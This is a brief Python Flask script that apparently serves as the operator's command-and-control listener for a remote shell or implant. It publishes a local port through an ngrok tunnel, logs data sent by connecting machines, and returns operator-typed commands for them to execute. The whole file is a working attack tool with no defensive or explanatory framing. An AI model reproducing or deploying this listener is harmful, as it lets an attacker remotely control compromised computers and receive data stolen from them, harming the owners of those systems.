#!/usr/bin/python3

from flask import Flask, jsonify, request
from os import system
from time import sleep

app = Flask("listener")

@app.route("/",methods=['GET'])
def listen():
	if "data" in request.args:
		print(request.args['data'])
	cmd = input("CMD> ")
	return cmd, 200

if __name__ == "__main__":
	port = int(input("Port to listen on: "))
	system("./ngrok http %s > /dev/null &" % str(port))
	sleep(7)
	system("curl -s -N http://127.0.0.1:4040/status | grep \"http://[0-9a-z]*\.ngrok.io\" -oh > ngrok.url")
	url = open("ngrok.url","r")
	print("Listening at: " + url.read())
	url.close()
	system("rm ngrok.url")
	app.run(host="127.0.0.1",port=port)
